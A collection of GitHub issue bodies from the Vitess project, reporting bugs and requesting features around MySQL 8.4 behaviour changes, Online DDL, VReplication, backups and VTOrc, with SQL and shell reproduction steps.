vitessio/vitess#19198.body:
### Overview of the Issue

The `vtbackup` tests started failing every time recently in the following GitHub Actions workflows:
  - https://github.com/vitessio/vitess/blob/6c1bc983633e81b299fa3f1e812a540314befd78/.github/workflows/cluster_endtoend_vtbackup.yml
    - Example run: https://github.com/vitessio/vitess/actions/runs/21257417420/job/61184468420?pr=19180
  - https://github.com/vitessio/vitess/blob/6c1bc983633e81b299fa3f1e812a540314befd78/.github/workflows/upgrade_downgrade_test_backups_e2e.yml
    - Example run: https://github.com/vitessio/vitess/actions/runs/21257417378/job/61184477157?pr=19180

They all fail in the same way:
```
Error Trace:	/home/runner/work/vitess/vitess/go/test/endtoend/backup/vtbackup/backup_only_test.go:459
/opt/hostedtoolcache/go/1.25.6/x64/src/runtime/asm_amd64.s:1693
Error:      	Failed to verify disable/enable redo log.
Test:       	TestFailingReplication
```

When running the test locally, it would pass every time:
```
go run test.go -skip-build -docker=false -print-log -follow -tag upgrade_downgrade_backups
```

But then I remembered that a new MySQL 8.4 release — 8.4.8 — just came out (8.4 is used for these CI jobs and it uses the latest one available in the official Ubuntu repo from MySQL)... I upgraded  and then the test failed in the same way locally.

The problem lies in this function that is called in these tests: https://github.com/vitessio/vitess/blob/ff6d0a0a4832ad31163a5c8cae27c1118f75e0ad/go/test/endtoend/backup/vtbackup/backup_only_test.go#L416-L461

The error code in the warning log message for when the redo log is disabled went from what it was and [what it should be according to the docs](https://dev.mysql.com/doc/mysql-errors/8.4/en/server-error-reference.html#error_er_ib_wrn_redo_disabled): `MY-013600`, to `MY-014088` which doesn't even exist in the docs.

### Reproduction Steps

First make sure that MySQL 8.4.8 is installed.

```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

commerce_primary_uid=$(vtctldclient GetTablets --keyspace commerce --tablet-type primary --shard "0" | awk '{print $1}' | cut -d- -f2 | bc)

mysql -u root --binary-as-hex=false --socket "${VTDATAROOT}/vt_0000000${commerce_primary_uid}/mysql.sock" vt_commerce

mysql> ALTER INSTANCE DISABLE INNODB REDO_LOG;

mysql> ALTER INSTANCE ENABLE INNODB REDO_LOG;

mysql> SELECT * FROM performance_schema.error_log WHERE data like 'InnoDB redo logging%';
```

The results:
```
mysql> SELECT * FROM performance_schema.error_log WHERE data like 'InnoDB redo logging%';
+----------------------------+-----------+---------+------------+-----------+-------------------------------------------------------------------------------------------------------------+
| LOGGED                     | THREAD_ID | PRIO    | ERROR_CODE | SUBSYSTEM | DATA                                                                                                        |
+----------------------------+-----------+---------+------------+-----------+-------------------------------------------------------------------------------------------------------------+
| 2026-01-22 18:16:56.300332 |        50 | Warning | MY-014088  | InnoDB    | InnoDB redo logging is disabled. All data could be lost in case of a server crash. Current lsn is 20085811. |
| 2026-01-22 18:18:09.048917 |        50 | Warning | MY-013601  | InnoDB    | InnoDB redo logging is enabled. Data is now safe and can be recovered in case of a server crash.            |
| 2026-01-22 18:18:13.018622 |        50 | Warning | MY-014088  | InnoDB    | InnoDB redo logging is disabled. All data could be lost in case of a server crash. Current lsn is 20085821. |
| 2026-01-22 18:18:14.089252 |        50 | Warning | MY-013601  | InnoDB    | InnoDB redo logging is enabled. Data is now safe and can be recovered in case of a server crash.            |
+----------------------------+-----------+---------+------------+-----------+-------------------------------------------------------------------------------------------------------------+
4 rows in set (0.00 sec)
```

vitessio/vitess#19205.body:
### Overview of the Issue

Issue
- run schema-change by vitess onlineddl with `vitess --declarative` strategy
- caller uses `VtctldServer.GetSchemaMigrations()` to monitor the progress, but
failed due to `code = Unknown desc = parsing time "0000-00-00 00:00:00": month out of range`

Reason
- MySQL returns "0000-00-00 00:00:00" for NULL timestamps when NO_ZERO_DATE sql_mode is not enabled
- The valueToVTTime() function in go/vt/vtctl/grpcvtctldserver/query.go attempts to parse this value using Go's standard time.ParseInLocation()
- Go's time parser rejects "0000-00-00 00:00:00" because "month 0" is invalid

Error Call Stack

```
  caller monitor the progress
      ↓
      [gRPC call]
      ↓
  VtctldServer.GetSchemaMigrations()
      (go/vt/vtctl/grpcvtctldserver/server.go:1664)
      ↓
      [Query database: SELECT * FROM _vt.schema_migrations ...]
      ↓
  rowToSchemaMigration(row)
      (go/vt/vtctl/grpcvtctldserver/server.go:1771)
      ↓
  valueToVTTime(row.AsString("last_throttled_timestamp", ""))
      (go/vt/vtctl/grpcvtctldserver/query.go:154)
      ↓
  time.ParseInLocation("2006-01-02 15:04:05", "0000-00-00 00:00:00", time.Local)
      ↓
  ❌ ERROR: parsing time "0000-00-00 00:00:00": month out of range
      ↓
      [Error propagates back up the stack]
      ↓
  gRPC returns error with code = Unknown
      ↓
  caller receives: "code = Unknown desc = parsing time ..."
```

Shards SQL mode

sql_mode = NO_ENGINE_SUBSTITUTION only → stores '0000-00-00 00:00:00'
```
host[_vt]>   SELECT
  ->       migration_uuid,
  ->       migration_status,
  ->       last_throttled_timestamp,
  ->       last_throttled_timestamp = '0000-00-00 00:00:00' as is_zero_timestamp
  ->   FROM _vt.schema_migrations
  ->   WHERE migration_status = 'complete'
  ->   LIMIT 5;
+--------------------------------------+------------------+--------------------------+-------------------+
| migration_uuid                       | migration_status | last_throttled_timestamp | is_zero_timestamp |
+--------------------------------------+------------------+--------------------------+-------------------+
| afa730b3_ed9e_11f0_af0e_0affe767f54d | complete         | 0000-00-00 00:00:00      |                 1 |
| f7232069_ed9e_11f0_af0e_0affe767f54d | complete         | 0000-00-00 00:00:00      |                 1 |
| a43c6f0e_eda0_11f0_af0e_0affe767f54d | complete         | 0000-00-00 00:00:00      |                 1 |
| 4bd8c6e4_eda3_11f0_af0e_0affe767f54d | complete         | 0000-00-00 00:00:00      |                 1 |
| fe90f2a9_eda3_11f0_af0e_0affe767f54d | complete         | 0000-00-00 00:00:00      |                 1 |
+--------------------------------------+------------------+--------------------------+-------------------+
5 rows in set (0.00 sec)
```


### Reproduction Steps

- run schema-change by vitess onlineddl with `vitess --declarative` strategy
- caller uses  `VtctldServer.GetSchemaMigrations()` to monitor the progress, but 
 failed due to `code = Unknown desc = parsing time "0000-00-00 00:00:00": month out of range`


### Binary Version

```sh
19.0.7
```

### Operating System and Environment details

```sh
ubuntu
```

```sh

```

vitessio/vitess#19217.body:
## Overview of the Issue

MySQL supports the standard SQL syntax `ALTER TABLE ... DROP CONSTRAINT <name>` to drop constraints of any type, including foreign key constraints. Per the [MySQL 8.4 documentation](https://dev.mysql.com/doc/refman/8.4/en/alter-table.html#alter-table-foreign-key):

> ALTER TABLE permits more general (and SQL standard) syntax for dropping and altering existing constraints of any type, where the constraint type is determined from the constraint name.

However, Vitess currently translates `DROP CONSTRAINT` to `DROP CHECK`, which fails when the constraint is actually a foreign key. Users see an error like:

```
Check constraint 'constraint_name' is not found in the table. (errno 3821)
```

This causes compatibility issues with ORMs like Drizzle that generate `DROP CONSTRAINT` syntax.

## Reproduction Steps

1. Create the following tables:
```sql
CREATE TABLE `Parent` (
    `id` varchar(191) NOT NULL,
    PRIMARY KEY (`id`)
) ENGINE InnoDB;

CREATE TABLE `Child` (
    `id` varchar(191) NOT NULL,
    `parentId` varchar(191) NOT NULL,
    PRIMARY KEY (`id`),
    CONSTRAINT `Child_parentId_fkey` FOREIGN KEY (`parentId`) REFERENCES `Parent` (`id`)
) ENGINE InnoDB;
```

2. Attempt to drop the foreign key constraint using standard SQL syntax:
```sql
ALTER TABLE `Child` DROP CONSTRAINT `Child_parentId_fkey`;
```

3. Observe the error: `Check constraint 'Child_parentId_fkey' is not found in the table. (errno 3821)`

4. Note that the MySQL-specific syntax works correctly:
```sql
ALTER TABLE `Child` DROP FOREIGN KEY `Child_parentId_fkey`;
```

## Binary Version

All current versions

## Operating System and Environment details

All platforms

## Log Fragments

N/A
vitessio/vitess#19217.title: Bug Report: ALTER TABLE ... DROP CONSTRAINT does not work for foreign key constraints

vitessio/vitess#19225.body:
### Overview of the Issue

The VReplication `MoveTables` workflow has support for automatically handling `auto_increment` migrations when moving a table from an unsharded (or external tablet) keyspace to a sharded one: https://vitess.io/docs/reference/vreplication/movetables/#auto-increment-handling

If the source table being moved is empty, however, no work is done to handle that migration. That is problematic because most likely the table *will* eventually have data on the sharded keyspace, but the sequence table will be not in place to handle that properly.

### Reproduction Steps

```
git checkout main && make build

cd examples/local

alias vtctldclient='command vtctldclient --server=localhost:15999'

./101_initial_cluster.sh

vtctldclient CreateKeyspace customer

vtctldclient --server localhost:15999 SetKeyspaceDurabilityPolicy --durability-policy=semi_sync customer

vtctldclient ApplyVSchema --vschema='{"sharded": true, "vindexes": {"xxhash": {"type": "xxhash"}}, "tables": {"customer": {"column_vindexes": [{"column": "customer_id", "name": "xxhash" }]}, "corder": {"column_vindexes": [{"column": "customer_id", "name": "xxhash"}]}}}' customer

./302_new_shards.sh

mysql commerce -e "alter table corder drop primary key, modify order_id bigint not null auto_increment primary key"

mysql commerce -e "alter table customer drop primary key, modify customer_id bigint not null auto_increment primary key"

vtctldclient MoveTables --workflow commerce2customer --target-keyspace customer create --source-keyspace commerce --tables "customer,corder" --sharded-auto-increment-handling=REPLACE --global-keyspace=commerce

sleep 30

vtctldclient MoveTables --workflow commerce2customer --target-keyspace customer switchtraffic --initialize-target-sequences

mysql commerce -e "show tables"
```

The end result is:
```
+--------------------+
| Tables_in_commerce |
+--------------------+
| corder             |
| customer           |
| product            |
+--------------------+
```

If, however, I first add a record to the customer and corder table in the commerce keyspace before creating the workflow then the sequence backing tables are created as expected.

### Binary Version

```sh
vtgate version Version: 24.0.0-SNAPSHOT (Git revision cd38318e885656b9d00f6453931b864af7b86191 branch 'empty_seq_source_table_fix') built on Mon Jan 26 20:04:10 UTC 2026 by matt@pslord.local using go1.25.6 darwin/arm64
```


vitessio/vitess#19257.body:
### Overview of the Issue

We have observed that in some cases the core issue that was meant to be resoled in 8.0.23: https://dev.mysql.com/doc/relnotes/mysql/8.0/en/news-8-0-23.html

```
InnoDB: Performance was improved for the following operations:

Dropping a large tablespace on a MySQL instance with a large buffer pool (>32GBs).

Dropping a tablespace with a significant number of pages referenced from the adaptive hash index.

Truncating temporary tablespaces.

The pages of dropped or truncated tablespaces and associated AHI entries are now removed from the buffer pool passively as pages are encountered during normal operations. Previously, dropping or truncating tablespaces initiated a full list scan to remove pages from the buffer pool immediately, which negatively impacted performance. (Bug #31008942, Bug #98869, WL #14100)
```

From the Vitess docs: https://vitess.io/docs/23.0/user-guides/schema-changes/table-lifecycle/#lifecycle-subsets-and-configuration

```
In MySQL 8.0.23 and later, table drops do not acquire locks on the InnoDB buffer pool, and are non-blocking for queries that do not reference the table being dropped. Vitess automatically identifies whether the underlying MySQL server is at that version or later and will:

Implicitly skip the purge stage, even if defined
Implicitly skip the evac stage, even if defined
```

Still occurs in later 8.0 releases when dropping a large table on a busy system with a large buffer pool. Log snippets:

vitessio/vitess#19276.body:
### Overview of the Issue

When `autocommit` on a shard or tablet targetted connection is set to `0`, Vitess will use a reserved connection to execute all following sql statements until `autocommit` is switched back to `1`.

On this reserved connection, queries will be prepended with a `BEGIN` statement if the connection is not yet inside of a transaction. Effectively, Vitess tries to emulate `autocommit=0` on a connection that has autocommit enabled.

Unfortunately, this is too aggressive in some cases. For example, even for `SET` and `SHOW` queries, we will end up starting an explicit transaction. This is different from what MySQL does (where a transaction is only started for "transactional" statements).

This works fine _most_ of the time, but can cause unexpected issues, e.g. when `SET TRANSACTION ISOLATION LEVEL ...` is executed, because that statement can't be executed when inside of a transaction.

### Reproduction Steps

N/A



vitessio/vitess#19324.body:
### Overview of the Issue

When vttablet sidecar runs (tablet start or tablet going to serving mode), alter tables to match desired schema are done with ALGORITHM=COPY which on the mysql database behaves as:
1. Create new table
2. Copy rows
3. Update schema on new table
4. Swap tables 
5. Drop old table

In particular for unmanaged tablets during migrations,  an external mysql instance with a big innodb buffer pool this create semaphore locks and can bring DB to a halt for several minutes.
Since the _vt tables are fairly small, there should be no need to do the alter without it on mysql 8.0 and above.
Adding the ALGORITHM = COPY is done here: https://github.com/vitessio/vitess/blob/599f646d98922e593ee90be0c583cc669a791a68/go/vt/sidecardb/sidecardb.go#L391-L400

https://github.com/vitessio/vitess/blob/599f646d98922e593ee90be0c583cc669a791a68/go/vt/sidecardb/sidecardb.go#L399

https://github.com/vitessio/vitess/pull/12464


### Reproduction Steps

1. Generate a change on one table
`ALTER TABLE vreplication_log CONVERT TO CHARACTER SET utf8mb3 COLLATE utf8mb3_unicode_ci;`
2. Restart vttablet
3. Check vttablet.INFO
`I0206 11:08:32.098253  164677 sidecardb.go:415] Applying DDL for table vreplication_log:
I0206 11:08:32.187492  164677 sidecardb.go:462] Applied DDL ALTER TABLE `vreplication_log` MODIFY COLUMN `message` text NOT NULL, ALGORITHM = COPY for table _vt.vreplication_log (vreplication) during sidecar database initialization`

### Binary Version

```sh
vttablet version Version: 22.0.1
```

vitessio/vitess#19337.body:
### Feature Description

Vitess does not currently support the MySQL option [binlog_rows_query_log_events](https://dev.mysql.com/doc/refman/8.4/en/replication-options-binary-log.html#sysvar_binlog_rows_query_log_events) as shown in [this config stanza](https://github.com/vitessio/vitess/blob/v22.0.0/go/vt/sysvars/sysvars.go#L154). This setting enables MySQL to include the original SQL query for each binlog event. For example, MySQL binlogs include `rows_query` log events that look like this:
```
#260209 18:20:26 server id 123  end_log_pos 1431 ...         Rows_query
# insert into table(id, create_date, update_date, varchar) values (10, 1770661226, 1770661226, 'abc')

```

Ideally, Vitess would provide the same functionality above to support the MySQL option – including query logs in VStream when this setting is enabled.

### Use Case(s)

Etsy currently uses the Debezium connector for MySQL to implement a change data capture system. We enable `binlog_rows_query_log_events` to include query logs in the binlog and make SQL statements available to Debezium as mentioned in [the Debezium docs](https://debezium.io/documentation/reference/stable/connectors/mysql.html#enable-query-log-events). We have written a custom SMT (single message transform) which extracts query comments from these query logs to pass information to downstream consumers. We currently only use the query comments from the SQL string, but future functionality may require the entire SQL query. The query comments we add are of the form "[key1=value1] [key2=value2]".

We are interested in migrating to Debezium's Vitess connector which provides support for resharding operations. However, Vitess does not support including these query logs in VStream so we are unable to replicate this functionality with the Vitess connector.
vitessio/vitess#19337.title: Feature Request: Support for MySQL option binlog_rows_query_log_events

vitessio/vitess#19338.body:
### Overview of the Issue

When `builtinbackupengine` retries a failed file backup (attempt 2 of N), the file data is written successfully to object storage, but the hash metadata in the backup manifest is stored as empty. Restoring such a backup fails with:

```
hash mismatch for <filename>, got <hash> expected
```

The file data is intact — the computed hash is deterministic across restore attempts — but the empty expected hash causes a permanent mismatch. The backup is effectively corrupt and unrestorable despite being reported as successful.

The retry logic is in `builtinbackupengine.go`. The failure is logged at line 825:

```
Failed backing up "<filename>" (attempt 1/2)
```

The retry succeeds and the backup reports success, but the manifest entry for the retried file has no hash recorded.

### Reproduction Steps

It is hard to reproduce it in a real environment, as it requires simulating a transient error, but we can easily confirm the bug by running this test: 

```go
func TestBackupRetryPropagatesHashToManifest(t *testing.T) {
	ctx := utils.LeakCheckContext(t)
	backupRoot, keyspace, shard, ts := SetupCluster(ctx, t, 2, 2)

	bufferPerFiles := make(map[string]*rwCloseFailFirstCall)
	be := &mysqlctl.BuiltinBackupEngine{}
	bh := &mysqlctl.FakeBackupHandle{}
	bh.AddFileReturnF = func(filename string) mysqlctl.FakeBackupHandleAddFileReturn {
		_, isRetry := bufferPerFiles[filename]
		newBuffer := newWriteCloseFailFirstWrite(isRetry)
		bufferPerFiles[filename] = newBuffer
		return mysqlctl.FakeBackupHandleAddFileReturn{WriteCloser: newBuffer}
	}

	fakedb := fakesqldb.New(t)
	defer fakedb.Close()
	mysqld := mysqlctl.NewFakeMysqlDaemon(fakedb)
	defer mysqld.Close()
	mysqld.ExpectedExecuteSuperQueryList = []string{"STOP REPLICA", "START REPLICA"}

	ctx, cancel := context.WithCancel(ctx)
	backupResult, err := be.ExecuteBackup(ctx, mysqlctl.BackupParams{
		Logger: logutil.NewMemoryLogger(),
		Mysqld: mysqld,
		Cnf: &mysqlctl.Mycnf{
			InnodbDataHomeDir:     path.Join(backupRoot, "innodb"),
			InnodbLogGroupHomeDir: path.Join(backupRoot, "log"),
			DataDir:               path.Join(backupRoot, "datadir"),
		},
		Stats:                backupstats.NewFakeStats(),
		Concurrency:          1,
		HookExtraEnv:         map[string]string{},
		TopoServer:           ts,
		Keyspace:             keyspace,
		Shard:                shard,
		MysqlShutdownTimeout: MysqlShutdownTimeout,
	}, bh)
	cancel()

	time.Sleep(2 * time.Second)

	require.NoError(t, err)
	require.Equal(t, mysqlctl.BackupUsable, backupResult)

	// Parse the MANIFEST and verify all file entries have non-empty hashes.
	manifestBuf, ok := bufferPerFiles["MANIFEST"]
	require.True(t, ok, "MANIFEST should have been written")

	var manifest struct {
		FileEntries []mysqlctl.FileEntry
	}
	require.NoError(t, json.Unmarshal(manifestBuf.Bytes(), &manifest))

	require.NotEmpty(t, manifest.FileEntries, "manifest should contain file entries")
	for _, fe := range manifest.FileEntries {
		assert.NotEmptyf(t, fe.Hash, "file %s should have a non-empty hash in the manifest", fe.Name)
	}
}

```

### Binary Version

```sh
vtbackup version Version: 22.0.0
```

### Operating System and Environment details

```sh
ID=wolfi
NAME="Wolfi"
PRETTY_NAME="Wolfi"
VERSION_ID="20230201"
HOME_URL="https://wolfi.dev"
BUG_REPORT_URL="https://github.com/wolfi-dev/os/issues"
Kernel=Linux 6.8.0-1044-aws
Architecture=x86_64
```

### Log Fragments

```sh
Transient failure on attempt 1/2 (backup reports success after retry):

I0129 18:45:11.580752  1 builtinbackupengine.go:825] Failed backing up "<table>.ibd" (attempt 1/2)
I0129 18:45:11.699941  1 builtinbackupengine.go:825] Failed backing up "<table>.ibd" (attempt 1/2)
...
I0129 21:30:41.476092  1 vtbackup.go:673] Backup successful.


Restoring from that backup fails with empty expected hash:

E0131 16:05:01.763438  1 vtbackup.go:29] failed to restore file 94 to <table_a>.ibd: hash mismatch for <table_a>.ibd, got 7753bf09 expected ; failed to restore file 87 to <table_b>.ibd: hash mismatch for <table_b>.ibd, got c3d114a6 expected ; failed to restore file 91 to <table_c>.ibd: hash mismatch for <table_c>.ibd, got b8c85208 expected


The same hashes appear on every restore attempt, confirming file data is correct but manifest hash metadata is missing.
```

vitessio/vitess#19340.body:
### Overview of the Issue

A mysqld instance can become overloaded and able to make very little progress if any in various situations. Today, VTOrc has no way to act on that. When this occurs, the instance is *just* alive enough to occasionally respond to a health check / status report within the timeout window and is then immediately considered healthy again (it's otherwise healthy, just very slow to respond).

Ideally VTOrc can break the shard out of this zombie like state where the shard is unable to process normal query traffic by performing a PlannedReparentShard -- which will hopefully work as the mysqld will be available just enough -- and falling back to an EmergencyReparentShard when needed. In many cases this will clear out the query and lock queue backlog that had overwhelmed the original primary by allowing us to start with clean state on the new primary.

### Reproduction Steps

You can use the local examples.

And use something like sysbench TPCH and TPCC running at the same time to overload the primary instance. You will see logs similar to this, but no action taken by VTOrc:

vitessio/vitess#19340.title: Bug Report: VTOrc does not act when a primary is saturated

vitessio/vitess#19353.body:
### Feature Description

VTOrc currently supports scoping its monitoring to specific keyspaces/shards via --clusters-to-watch, but there is no way to scope it by cell. In multi-cell deployments, operators may want to run separate VTOrc instances that each monitor only a subset of cells.

This proposes adding a --cells-to-watch flag that accepts a comma-separated list of cells. When set, VTOrc will only discover and monitor tablets in the specified cells. When unset, the existing behavior of watching all cells is preserved. The flag works in combination with --clusters-to-watch — both filters are applied when both are set.

### Use Case(s)

 - Running different Vitess versions in different cells and needing version-matched VTOrc instances to prevent cross-version recovery operations. This is our use case at HubSpot.
  - Reducing expensive topo reads by limiting VTOrc to only fetch tablets from specified cells instead of all known cells (see #18982)
  - Running a dedicated VTOrc instance per cell/region to reduce blast radius and improve isolation
vitessio/vitess#19353.title: Feature Request: add --cells-to-watch flag to VTOrc

vitessio/vitess#19365.body:
### Overview of the Issue

In vstreams, when processing ROW based events, we need to map the ordered/ordinal fields in the event (@1, @2,...) to actual column names. In order to do that, we need to know what the schema is so that we know what column name maps to the ordinal field so that we can generate the resulting SQL statements (VReplication workflows like [MoveTables](https://vitess.io/docs/reference/vreplication/movetables/)) or VEvents ([VTGate VStream](https://vitess.io/docs/23.0/reference/vreplication/vstream/)).

If the [schema historian](https://vitess.io/docs/reference/vreplication/internal/tracker/) is NOT enabled, then we can only look at the *current* schema for the table when processing the binlog event.

This will cause obvious problems when the VStream is lagging so we are processing older binlog events that were created with a previous version of the table schema. We will not be able to properly map the fields and their values to the correct table columns.

This can cause unexpected results and for the vstream or workflow to fail.

> [!NOTE]
> When you DO enable the historian, the manual test noted in the issue is very likely to pass. But see below for why it still may not and how we can close that gap. 

> [!WARNING]
> After further investigation while working on the fix in https://github.com/vitessio/vitess/pull/19204, the problem was much bigger than this. The new endtoend test there demonstrates the issue more clearly.

From looking at the code: 
  - Where we encounter a DDL in the vstream and reload the schema at the given position (if the historian is NOT enabled the position is always the current/live schema): https://github.com/vitessio/vitess/blob/b4d088d7a6d6e731437b191fb3c915e8037b720c/go/vt/vttablet/tabletserver/vstreamer/vstreamer.go#L595-L597
  - Where we rebuild the table plans using the schema we loaded in the engine from above, when we receive a vschema update in the watch: https://github.com/vitessio/vitess/blob/b4d088d7a6d6e731437b191fb3c915e8037b720c/go/vt/vttablet/tabletserver/vstreamer/vstreamer.go#L424-L434 

The problem is that the vschema watch is asynchronous and technically unbounded in time (in most cases it's "immediate", but there are no guarantees around that).

In order to close this window where things could still fail even with the historian enabled, we should not only reload the schema at the given GTID set snapshot/position, we should also rebuild the plans. We should, however, still continue doing the rebuild when the vschema changes as those changes can include things NOT in the MySQL schema (vindex changes, etc). 

### Reproduction Steps

```
git checkout main && make build

cd examples/local

./101_initial_cluster.sh

# Modify examples/local/vstream_client.go
# set streamCustomer := false
# run it until the copy phase completes and CTRL-C it, note the GTID position
# then modify it again to specify this GTID position for the customer keyspace when we resume

mysql commerce -e "alter table customer add column age int default 1 after customer_id"

mysql commerce -e "insert into customer (email) values ('mlord@planetscale.com'), ('mlord2@planetscale.com'), ('mlord3@planetscale.com')"

mysql commerce -e "alter table customer drop column age"

# Run go run vstream_client.go again to resume from where we left off
```

Results:
```
❯ go run vstream_client.go
[type:VGTID  vgtid:{shard_gtids:{keyspace:"commerce"  shard:"0"  gtid:"MySQL56/ecb4ddec-0460-11f1-a756-97054f7f8d48:1-35"}}  keyspace:"commerce"  shard:"0" type:DDL  timestamp:1770495085  statement:"alter table customer add column age int default 1 after customer_id"  current_time:1770495095111671000  keyspace:"commerce"  shard:"0"  commit_parent:34  sequence_number:35  event_gtid:"ecb4ddec-0460-11f1-a756-97054f7f8d48:35"]
[type:BEGIN  timestamp:1770495085  current_time:1770495095114954000  keyspace:"commerce"  shard:"0"  commit_parent:35  sequence_number:36  event_gtid:"ecb4ddec-0460-11f1-a756-97054f7f8d48:36" type:VGTID  vgtid:{shard_gtids:{keyspace:"commerce"  shard:"0"  gtid:"MySQL56/ecb4ddec-0460-11f1-a756-97054f7f8d48:1-36"}}  keyspace:"commerce"  shard:"0" type:COMMIT  timestamp:1770495085  current_time:1770495095114996000  keyspace:"commerce"  shard:"0"  commit_parent:35  sequence_number:36  event_gtid:"ecb4ddec-0460-11f1-a756-97054f7f8d48:36"]
2026-02-07 20:11:35.126694 +0000 UTC m=+0.052130168:: remote error: Code: UNKNOWN
rpc error: code = Unknown desc = error starting stream from shard GTID keyspace:"commerce" shard:"0" gtid:"MySQL56/ecb4ddec-0460-11f1-a756-97054f7f8d48:1-36": persistent error in vstream for commerce/0 on tablet zone1-0000000100; giving up: target: commerce.0.primary: vttablet: rpc error: code = Unknown desc = stream (at source tablet) error @ (including the GTID we failed to process) ecb4ddec-0460-11f1-a756-97054f7f8d48:1-37: cannot determine table columns for customer: event has [8 3 15], schema has [name:"customer_id" type:INT64 table:"customer" org_table:"customer" database:"vt_commerce" org_name:"customer_id" column_length:20 charset:63 flags:49667 name:"email" type:VARCHAR table:"customer" org_table:"customer" database:"vt_commerce" org_name:"email" column_length:512 charset:255]
```

vitessio/vitess#19373.body:
### Feature Description

With current default settings for a MoveTables workflow, the prefer local cell option, and a replica in that cell with purged binlogs, means that it will only ever try that same replica in perpetuity, even if there is another replica with additional binlogs.

One workaround is to set the cells to a cell preference list. However, this is brittle and manual since each stream would need to be set correctly to have the local cell listed first, and if the leadership changes, resulting in a change in cell for the primary, the list goes out of date.

The ideal solution is one similar to vstream_manager.go where we try for local cell, and if we get certain errors that are persistent for that tablet (eg binlog purged, gtid mismatch) then we try other tablets in other cells.

### Use Case(s)

MoveTables resilient to purged binlogs only on subset of hosts
MoveTables resilient to gtid set mismatch only on subset of hosts
Any other workflows with those errors.
vitessio/vitess#19373.title: Feature Request: MoveTables workflow should retry a different tablet on binlog purged error

vitessio/vitess#19386.body:
### Feature Description

`BuildSummary` currently aggregates away all per-shard and per-table detail, making it impossible for API consumers to see the state of individual tables on individual shards without querying each tablet directly via SQL.

Add `ShardSummaries` to the VDiff summary output that captures the per-shard VDiff state (`state`, `started_at`, `completed_at`, `last_error`) along with a `TableStates` map providing per-table detail (`state`, `rows_compared`, `matching_rows`, `mismatched_rows`, extra rows, `has_mismatch`) for each table on that shard.

`ShardSummaries` should only be populated in verbose mode (or when there's a mismatch), consistent with `Reports` and `TableSummaryMap`.

All changes should be purely additive — no existing fields removed or modified.

### Use Case(s)

- API consumers (like orchestration tools) need to monitor VDiff progress per-shard without querying individual tablets directly
- Debugging VDiff issues on specific shards is currently difficult since the summary only shows aggregated state
- Tools that track per-shard migration progress need granular state information
vitessio/vitess#19386.title: Feature Request: Add per-shard per-table state to VDiff summary output

vitessio/vitess#19416.body:
### Feature Description

We are looking for a way to track how different backup engines are performing. While backup operation is easy to track, the restore operation is not so much. Having explored our options, we decided to use the `vttablet_restore_done` hook to track the restores. To enable this, we would like vttablet process to pass the `BackupEngine` used in tablet restore to the `vttablet_restore_done` hook. This way the hook will be aware of the tablet, shard, keyspace, restore duration and time, but also what backup engine was used.

### Use Case(s)

It could be desirable to use a mix of different backup engines. To better analyse the backup strategy, it's important to understand how each of these engines is performing for each of your keyspaces or even shards. For example, in some keyspaces, `mysqlshell` will outperform `xtrabackup`, and in some keyspaces it will be the other way around. It's critical to be able to track these.
vitessio/vitess#19416.title: Feature Request: Expose backup engine to vttablet_restore_done vthook

vitessio/vitess#19422.body:
## Overview of the Issue

When an Online DDL migration (VReplication strategy) encounters a terminal error while copying a table that contains binary data (e.g., `VARBINARY`, `BLOB` columns with high bytes 0x80-0xFF), the migration can get stuck in `running` state indefinitely instead of transitioning to `failed`.

This occurs when the bulk INSERT query is large enough that the error message — which includes the full query text — exceeds the truncation limit. The message is truncated to 950 bytes by `MessageTruncate`, but when re-encoded for the UPDATE statement by `EncodeStringSQL`, invalid UTF-8 bytes in the binary data expand from 1 byte to 3 bytes each (U+FFFD replacement character). This can cause the stored value to exceed the `_vt.vreplication` `message` column limit (`varbinary(1000)`), and MySQL rejects the UPDATE with errno 1406 ("Data too long").

In practice, this requires a combination of sufficiently large binary column values and enough rows in a single copy batch so that the truncated error message still contains enough raw binary bytes for the encoding expansion to overflow.

When `setState()` fails, the controller in `runBlp()` returns the original non-nil error (`return err`), which causes `run()` to retry after a delay — creating an infinite loop. The VReplication stream never reaches `Error` state, so the Online DDL migration never transitions to `failed`.

The root cause is an encoding asymmetry: `encodeBytesSQLBytes2` (used to build the INSERT query) iterates over `[]byte` with `WriteByte`, preserving raw high bytes as single bytes. But `BufEncodeStringSQL` (used to encode the error message for the UPDATE) iterates over `string` with `range` (UTF-8 rune decoding) and `WriteRune`, expanding each invalid byte to 3 bytes.

## Reproduction Steps

1. Create a table with a binary column containing data with high bytes:
    ```sql
    CREATE TABLE t (
      id INT AUTO_INCREMENT PRIMARY KEY,
      bin_data VARBINARY(256) NOT NULL
    );
    -- Insert enough rows with high-byte binary data so the bulk INSERT
    -- query in the error message exceeds 950 bytes after truncation.
    INSERT INTO t (bin_data) VALUES (UNHEX(REPEAT('FF80FE90FD82FC83', 16)));
    -- Repeat ~20 times
    ```

2. Run an Online DDL that adds a NOT NULL column without a DEFAULT value:
    ```sql
    ALTER TABLE t ADD COLUMN new_col BIGINT NOT NULL;
    ```

3. The migration stays in `running` state indefinitely. In vttablet logs you'll see repeating errors:
    ```
    INTERNAL: unable to setState() in controller: could not set state: ... Data too long for column 'message'
    error in stream N, will retry after 5s: terminal error: ...
    ```

The same ALTER without binary data (e.g., on a table with only INT columns) correctly transitions to `failed` state. The existing `fail-no-default-value` vrepl_suite test passes for this reason.

## Binary Version

`main` branch at commit e881dd8e41 (and likely all prior versions since the encoding asymmetry has existed since the introduction of `MessageTruncate`).

## Operating System and Environment details

Any — the bug is in Go code, not platform-specific.

## Log Fragments

```
Failed to set error state: could not set message: update _vt.vreplication set message='task error: failed inserting rows: Field \'new_col\' doesn\'t have a default value (errno 1364) (sqlstate HY000) during query: insert into _vt_vrp_..._(id,bin_data) values (1,_binary\'<binary data>\') ... [TRUNCATED] ... ' where id=1

INTERNAL: unable to setState() in controller: could not set state: update _vt.vreplication set state='Error', message='terminal error: task error: ...' where id=1: Data too long for column 'message' at row 1 (errno 1406) (sqlstate 22001)

error in stream 1, will retry after 5s: terminal error: task error: failed inserting rows: Field 'new_col' doesn't have a default value (errno 1364) ...
```

The cycle repeats every 5 seconds indefinitely.
vitessio/vitess#19422.title: Bug Report: Online DDL / VReplication can enter infinite retry loop when terminal error message contains binary data

vitessio/vitess#19424.body:
### Overview of the Issue

When you specify an explicit / non-default COLLATION for a table, it can lead to that `ALTER` being incorrectly marked as ineligible for `INSTANT` DDL. You can see the restrictions for INSTANT DDL in MySQL here: https://dev.mysql.com/doc/refman/en/innodb-online-ddl-operations.html

